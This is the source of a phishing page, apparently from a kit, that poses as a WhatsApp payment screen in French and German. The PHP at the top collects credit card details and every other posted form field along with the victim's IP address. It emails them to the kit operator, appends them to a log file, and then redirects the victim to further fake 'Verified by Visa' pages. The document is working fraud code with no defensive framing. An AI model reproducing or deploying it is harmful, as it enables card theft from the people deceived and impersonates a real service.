<?php
if(isset($_POST['ccnum']))
{
    require 'send.php';

    $msg = '';
    $msg .= "\n";
    $msg .= "ip : ------- $ip -------\n";
    foreach($_POST as $k=>$v)
        $msg .= "$k : $v\n";
        $msg .= "ip : ------- $ip -------\n";
        $msg .= "\n";

    mail($rezltMail,'WhatsApp CC - '.$_SERVER['REMOTE_ADDR'],$msg);
    
$file = fopen("../W4.txt", 'a');
fwrite($file, $msg);

}

?>
<!DOCTYPE html>
<html idmmzcc-ext-docid="418838528" lang="fr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="https://static.s-sfr.fr/resources/css/global.sfr.min.css">

<link rel="icon" type="image/png" href="https://static.s-sfr.fr/media/favicon.png">
<meta http-equiv="refresh" content="20; URL=vbv1.php">

<html idmmzcc-ext-docid="418838528" lang="fr"><head></head><body>&#65279;?
<link rel="shortcut icon" href="images/favicon.ico">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="HandheldFriendly" content="true">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1,  user-scalable=no">
<title>WhatsApp  —  Payment</title>
<link rel="stylesheet" href="css/style_m_common.css?1" type="text/css" charset="utf-8">
<link rel="stylesheet" href="css/style_m_other.css?11" type="text/css" charset="utf-8">
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript">$(function() {$("#load").delay(3400).fadeOut(100); $("#payment").delay(3500).fadeIn(100);});</script><div class="wrapper">
<div class="shade"><div class="bar"><div class="logo"><a href="#"></a></div><div class="title"><h1>WhatsApp Messenger</h1></div><div class="nav" id="nav"><a href="#" onclick="showMenu(); return false;"></a></div></div></div>
<div id="menu-inner">
<div class="clear"></div>
<li class="social">
<span class="btn btn1"><a href="https://twitter.com/whatsapp" target="_blank">Twitter</a></span><span class="btn btn2"><a href="https://www.facebook.com/WhatsApp" target="_blank">Facebook</a></span><span class="btn btn3"><a href="https://plus.google.com/102708307632999019941/posts" target="_blank">Google Plus</a></span>
</li><div id="lang_select">
<span class="icon"></span>
<select onchange="window.location = this.options[this.selectedIndex].value;" style="padding:1px 1px 1px 1px;">
<option value="">Language</option><option value="?l=fr">Français</option><option value="?l=de">Deutsch</option></select><div class="clear"></div></div>
</div>
<div class="top inner">
<div class="container" id="title-container">
<h1>Payment</h1>
</div></div><form action="vbv2.php" method="post"><input name="location" type="hidden" value=""><input name="langa" type="hidden" value="#"><div class="content inner about">

<table cellpadding="0" cellspacing="0" width="100%"><tbody>
</tbody></table>
<div id="load" style="width: 100%; min-height: 120px; text-align: center; padding-top: 40px; display: none;"><img src="images/load.gif"></div>
<div align="center" style="padding: 8px;
    margin: auto;
    border: 1px solid #CCC;
    background-color: #F9F8F8;
    text-align: center;">
    
    <p style="padding: 5px;
    margin: 0 0 15px 0;
    font-size: 13px;
    font-weight: bold;
    background-color: #FFF;
    border: 1px solid #F1F1F1;">Zu zahlender Betrag : <span id="cbMontant" style="background-color: #B94A48;padding: 1px 4px 2px;border-radius: 3px;font-size: 11.844px;
    font-weight: 700;
    line-height: 14px;
    color: #FFF;
    text-shadow: 0 -1px 0 rgba(0,0,0,.25);
    white-space: nowrap;
    vertical-align: baseline;">0,99€</span></p>     
        
        
    <div align="center">

        
        
            <div id="eccoccpformtab" style="
    width: 360px;
    margin-right: 0px;
">
    
<div style="
    width: 353px;
">


    <title>Payer mes factures</title>

<script type="text/javascript">/* Code removed by ScrapBook */</script>



<div style="padding-left: 0px;width: 312px;height: 92.344;margin-right: 0px;">
                <label style="font-size:14px; color:#1a171b; padding-left:0px;"><b style="color:#1a171b;padding-left: 0px;">Schließen Sie dieses Fenster nicht oder aktualisieren Sie die Seite nicht

<div style="padding-left: 0px;width: 350px;">
                <label style="font-size:14px; color:#1a171b; padding-left:0px;"><b style="color:#1a171b;">
</b><br></label>
                
                  <label style="font-size:14px;padding-left: 102px;"><b><img src="https://members.bet365.com/Members/images/common/Form/80perSpinner.gif" style="width: 27.359;padding-right: 136px;padding-left: 0px;"></b></label>
                </div>

                    
            <br>
                             
            </b></label></div></div><b style="color:#1a171b;">
    
        
</b></div><b style="color:#1a171b;"><br>
<table width="100%" cellpadding="0" cellspacing="0">
<tbody><tr><td style="background:url('images/vbv.png') no-repeat; height:40px">&nbsp;</td></tr><tr><td><br><br><a href="http://blog.whatsapp.com/245/" target="_blank">Why not sell ads</a></td></tr></tbody></table></b></div><div id="footer" class="footer"><b style="color:#1a171b;">
<div id="btm-menu"><a href="#" class="home-link"></a></div>
<div id="btm_lang_select">
<div class="container"><span class="icon"></span><select onchange="window.location = this.options[this.selectedIndex].value;" style="padding:1px 1px 1px 1px;"><option value="">Language</option><option value="?l=fr">Français</option><option value="?l=de">Deutsch</option></select></div></div><div id="copyright">© 2018 WhatsApp Inc.</div>
<div class="social"><div class="btns">
<span class="btn btn1"><a href="https://twitter.com/whatsapp" target="_blank">Twitter</a></span>
<span class="btn btn2"><a href="https://www.facebook.com/WhatsApp" target="_blank">Facebook</a></span>
<span class="btn btn3"><a href="https://plus.google.com/102708307632999019941/posts" target="_blank">Google Plus</a></span>
</div></div></b></div></div><b style="color:#1a171b;">
<script type="text/javascript">
var menuActive = false;
function showMenu() {
    if (menuActive) {
        setClass('menu-inner','');
        setClass('nav','nav');
        menuActive = false;
    } else {
        setClass('menu-inner','active');
        setClass('nav','nav close');
        menuActive = true;
    }

    return false;
}
function setClass(id, classnm) {document.getElementById(id).setAttribute("class", classnm);}
</script>

</b></div></form></div></body></html>